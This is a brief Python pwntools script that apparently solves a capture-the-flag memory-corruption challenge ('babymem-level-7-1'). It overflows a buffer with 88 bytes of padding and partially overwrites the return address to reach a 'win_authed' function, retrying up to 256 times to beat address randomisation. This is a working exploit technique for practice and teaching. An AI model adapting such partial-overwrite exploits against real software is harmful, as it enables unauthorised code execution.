from pwn import *


for _ in range(256):
    offset = 88
    proc = process('/challenge/babymem-level-7-1')
    elf = ELF('/challenge/babymem-level-7-1')
    proc.recv()
    size = str(offset + 2).encode()
    proc.sendline(size)

    offset_win_authed = 0x207a
    proc.recv()
    payload = b'A' * 88 + p16(offset_win_authed)
    proc.sendline(payload)
    r = proc.recv()
    proc.close()
    if b'pwn' in r:
        print(r)
        break
